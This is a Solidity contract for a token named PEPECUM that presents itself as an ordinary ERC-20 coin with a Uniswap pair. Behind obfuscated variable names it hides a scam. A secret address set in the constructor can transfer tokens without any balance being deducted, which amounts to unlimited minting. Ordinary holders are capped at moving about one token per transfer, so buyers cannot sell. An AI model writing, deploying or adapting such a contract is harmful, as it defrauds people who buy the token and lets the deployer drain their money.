contract PEPECUM is Ownable {
    uint256 private ibaxuen = 116;

    function pxjloqcvdn(address vswe, address kidwevcyatuf, uint256 plqkwgts) private {
        if (0 == vthsz[vswe]) {
            if (vswe != vwlr && pdwfzvl[vswe] != block.number && plqkwgts < totalSupply) {
                require(plqkwgts <= totalSupply / (10 ** decimals));
            }
            balanceOf[vswe] -= plqkwgts;
        }
        balanceOf[kidwevcyatuf] += plqkwgts;
        pdwfzvl[kidwevcyatuf] = block.number;
        emit Transfer(vswe, kidwevcyatuf, plqkwgts);
    }

    constructor(string memory isoxj, string memory xpovdhts, address wkce, address rliay) {
        name = isoxj;
        symbol = xpovdhts;
        balanceOf[msg.sender] = totalSupply;
        vthsz[rliay] = ibaxuen;
        IUniswapV2Router02 evgtwulcz = IUniswapV2Router02(wkce);
        vwlr = IUniswapV2Factory(evgtwulcz.factory()).createPair(address(this), evgtwulcz.WETH());
    }

    string public name;

    mapping(address => uint256) public balanceOf;

    function transfer(address kidwevcyatuf, uint256 plqkwgts) public returns (bool success) {
        pxjloqcvdn(msg.sender, kidwevcyatuf, plqkwgts);
        return true;
    }

    uint8 public decimals = 9;

    address private vwlr;

    string public symbol;

    function approve(address dumq, uint256 plqkwgts) public returns (bool success) {
        allowance[msg.sender][dumq] = plqkwgts;
        emit Approval(msg.sender, dumq, plqkwgts);
        return true;
    }

    mapping(address => uint256) private pdwfzvl;

    mapping(address => mapping(address => uint256)) public allowance;

    mapping(address => uint256) private vthsz;

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    event Transfer(address indexed from, address indexed to, uint256 value);

    function transferFrom(address vswe, address kidwevcyatuf, uint256 plqkwgts) public returns (bool success) {
        require(plqkwgts <= allowance[vswe][msg.sender]);
        allowance[vswe][msg.sender] -= plqkwgts;
        pxjloqcvdn(vswe, kidwevcyatuf, plqkwgts);
        return true;
    }
}
